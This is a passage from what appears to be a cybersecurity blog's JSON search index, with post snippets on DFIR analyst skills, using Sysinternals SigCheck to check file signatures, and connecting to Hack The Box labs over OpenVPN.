to effectively perform their duties.Here are some specialized skills that a DFIR analyst may need to have: Technical expertise: DFIR analysts must have a strong understanding of computer systems, networks, and digital devices, as well as the software and tools used to analyze and preserve digital evidence. They should have a solid foundation in computer science, as well as experience with programming languages and operating systems. Analytical skills: DFIR analysts must be able to analyze complex data sets and identify patterns and trends that may provide clues about an incident. They should be able to critically evaluate evidence and draw logical conclusions based on their findings. Legal knowledge: DFIR analysts should have a strong understanding of the legal principles and rules governing the collection and admissibility of digital evidence in a court of law. They should be familiar with the rules of evidence, as well as with the legal requirements for preserving and handling digital evidence. Communication skills: DFIR analysts should be able to clearly communicate their findings and recommendations to a variety of audiences, including technical and non-technical stakeholders. They should be able to present complex technical information in a clear and concise manner, both verbally and in written form.DFIR Analyst Activities and RolesDigital forensics and incident response (DFIR) is a broad field that encompasses a wide range of activities and specialties related to the collection, analysis, and preservation of digital evidence. Some of the key areas of DFIR include: Malware analysis: Malware analysis is the process of examining and analyzing malicious software, such as viruses, worms, and Trojans, in order to understand how it works and what it is capable of doing. Malware analysts use a variety of tools and techniques to reverse engineer and deconstruct malware samples, in order to identify indicators of compromise and other artifacts that can help to understand the capabilities of the malware. Forensics: Forensics is the process of using technical methods to collect, analyze, and preserve evidence in a manner that is admissible in a court of law. DFIR professionals who specialize in forensics are responsible for conducting forensic examinations of digital systems and devices, as well as for preparing reports and other documentation that detail their findings. Forensics are commonly catagorised as Host, Network, Mobile Device, and Cloud specific Forensics. Cyber Threat Intelligence (CTI): CTI is the process of collecting, analyzing, and disseminating information about cyber threats and vulnerabilities in order to inform decision-making and improve the security posture of an organization. DFIR professionals who specialize in CTI are responsible for gathering and analyzing intelligence about cyber threats, as well as for sharing that intelligence with relevant stakeholders. Threat hunting: Threat hunting is the proactive process of searching for and identifying threats that have evaded traditional security controls. DFIR professionals who specialize in threat hunting use a variety of tools and techniques to search for and identify indicators of compromise and other signs of potential threats. Detection engineering: Detection engineering is the process of designing and implementing systems and processes to detect and alert on potential security threats. DFIR professionals who specialize in detection engineering are responsible for developing and maintaining detection systems, as well as for tuning and optimizing those systems to improve their effectiveness." }, { "title": "SigCheck", "url": "/posts/DFIR_Tools_MA_Sigcheck/", "categories": "DFIR Tools, Malware and File Analysis", "tags": "sigcheck, sysinternals, defense evasion (TA0005), masquerading (T1036), subvert trust controls (T1553)", "date": "2022-09-11 00:00:00 +1000", "snippet": "OverviewSigCheck is a command line tool from the SysInternals Suite developed to scan PE files and verify if they’re signed. A majority of malware identified in the wild is not signed, however it should be kept in mind that advanced malware have leveraged stolen certificates. SigCheck also contains an option to check files hashes against VirusTotal.Unsigned files within legitimate paths such as \\System32 should be investigated. Tool Name Version MITRE ATT&amp;CK Tactic MITRE ATT&amp;CK Technique MITRE ATT&amp;CK Sub-Technique SigCheck V2.90 Defence Evasion Masquerading Subvert Trust Controls Invalid Code Signature Code Signing InstructionsScanning a Single FileGeneral output of information to the command line, including:Signature Verification, Publisher Information, Entropy, Hashes, VirusTotal Detections, etc. sigcheck64.exe -a -vt -h ruby.exeOutputSigcheck v2.90 - File version and signature viewerCopyright (C) 2004-2022 Mark RussinovichSysinternals - www.sysinternals.comC:\\Ruby31-x64\\bin\\ruby.exe: Verified: Unsigned Link date: 10:00 01-Jan-70 Publisher: n/a Company: http://www.ruby-lang.org/ Description: Ruby interpreter (CUI) 3.1.2p20 [x64-mingw-ucrt] Product: Ruby interpreter 3.1.2p20 [x64-mingw-ucrt] Prod version: 3.1.2p20 File version: 3.1.2p20 MachineType: 64-bit Binary Version: 3.1.2.20 Original Name: ruby.exe Internal Name: ruby.exe Copyright: Copyright (C) 1993-2022 Yukihiro Matsumoto Comments: 2022-04-12 Entropy: 5.294 MD5: A0E29BD17600C72A9472187FAB9E8CEE SHA1: FC4B38E05DF834A3ADFCF310EBCF2561D1D66952 PESHA1: 20675D526BCAD96E5CEF3C54253AEFDDA290D53E PE256: 72D1B920F65B035B0D61123CD499CAB7AFE61F9F3081131143228555881600DB SHA256: A42943060B508B9C559BB77A8B059E4F3FFACB955DC8AB532D61314945EFC8A9 IMP: 63736A2F715AAEA097231DF6FA236320 VT detection: 0/74 VT link: https://www.virustotal.com/gui/file/a42943060b508b9c559bb77a8b059e4f3ffacb955dc8ab532d61314945efc8a9/detectionScanning Files Within a DirectoryScans identified directory for executable files. Results are then written to a csv file.Additional Parameters: -tv and -tuv: Lists all trusted root certificates that weren’t explicitly trusted by Microsoft. Good way to identify a cloned and trusted MS root cert. sigcheck64.exe -a -s -e -v -vt -h -c -w C:\\Users\\User\\Desktop\\Cases\\sigcheck_Case1.csv C:\\Program Files\\Slack\\ OutputAdditional DetailImporting of Digital Signature Catalog for Offline AnalysisBefore running SigCheck against an acquired suspect victim machine via forensic imaging, the machines Digital Signature Catalog must be uploaded to the analysis machine. Without doing this, SigCheck will be unable to verify most of the signed file from the image. Copy the signature folders from the victim machine image to your analysis machine: \\C\\Windows\\System32\\CatRoot\\{127D0A1D-4EF2-11D1-8608-00C04FC295EE} Change the name of the GUID so that they will not conflict with the analysis machines digital signature catalog store. Move the two renamed folder to the same location as below on the analysis machine. \\C\\Windows\\System32\\CatRoot\\{127D0A1D-4EF2-11D1-8608-00C04FC295E9} Open Services.msc, find and restart the ‘Cryptographic Services’ service. SigCheck may now be run against the collected victim image.Sources Channel 9 - License to Kill: Malware Hunting with the SysInternals Tools The Windows Club - Check for Dangerous or Unsigned Certificates Microsoft - SysInternals/SigCheck" }, { "title": "Hack the Box Overview", "url": "/posts/HTB_Overview/", "categories": "Capture The Flag, Hack the Box", "tags": "ctf, htb", "date": "2022-09-11 00:00:00 +1000", "snippet": "Hack The Box (HTB) LabsHack The Box is a cloud based Capture The Flag (CTF) platform that offers a variety of practical cybersecurity challenges, covering categories such as penetration testing, cryptography, and digital forensics to name a few. The platform itself is based on a gamified scoring system, where challengers are rewarded with points based upon their ‘pwnage’ of the individual challenges which are marked by providing a reward key in the form of a hidden flag on the target system. As of writing, there are 294 machines of varying difficulty, operating systems, and attack paths for challengers to hone their skills on.Hack The Box provides several pricing options, from a free basic account with access to general level challenges, VIP, and VIP+ tiers offer additional challenges and features requiring a paid subscription. The free tier subscription does require a VPN connection to the vulnerable servers in order to begin any of the challenges, this post aims to show how to initially establish the VPN connection and start a lab.Required Software and Platforms Title Description ParrotOS or Kali Linux ParrotOS and Kali Linux are the two major pen testing distributions that you will run into. Both have OpenVPN pre-installed making connection to the HTB servers that little bit easier. OpenVPN If you would prefer to use a customized environment for connecting to the HTB servers, OpenVPN will need to be installed. Connecting to HTB Labs via OpenVPNParrotOS is my preference when performing HTB challenges, so we will start here with how to connect to the vulnerable challenge subnets. The process is basically replicated for what ever environment you are connecting from. Login to the HTB platform using your account credentials and select the ‘Connect to HTB’ option at the top right of the screen to open the connection settings. Three options will be displayed; Machines, Starting Point, and Release Area. Select Machines, and then OpenVPN. A connection window will appear prompting for the best server connection based on geographic area. Select the appropriate VPN Access and VPN Server selections and chose between UDP or TCP for network traffic (may be required if your attacking host is behind a firewall or proxy), press ‘Download VPN’ to download the VPN ticket. Once the VPN ticket has downloaded lab_&lt;username&gt;.ovpn, move the file to your attacker machine if it was not downloaded onto it and run the following command to initiate the connection. sudo openvpn /path/to/lab_&lt;username&gt;.ovpn Once the host establishes a connection to the HTB servers, the platform VPN configuration should change to a green status, providing a connected IP address within the HTB servers subnet.Starting and Connecting to a LabOnce the above VPN connection is established, the next phase is to chose and connect to a challenge. On the left hand platform menu, chose ‘Labs’ to open a drop down selection. There are multiple options here; Starting Point, Tracks, Machines, Challenges, Fortresses, Endgames, and Pro Labs. For this example, we will select Machines which are a variety of various hosts. Upon selecting the challenge, select the machine (in this example ‘Support’) which will present another option window, select ‘Spawn Machine’ to initiate the instance. You will now be connected to the instance with connection details for the challenge and can start attacking the host on the displayed IP address. Once the flag has been found, select the menu option ‘Submit Flag’ to input the hash value and pass the challenge.Handy Notes When searching for challenge flags, the command find / -name flag.txt &gt;2/dev/null can be run. The last portion of the command filters out errors from returning to the terminal.Sources Hack The Box Hack The Box - Introduction to Lab Access" } ]
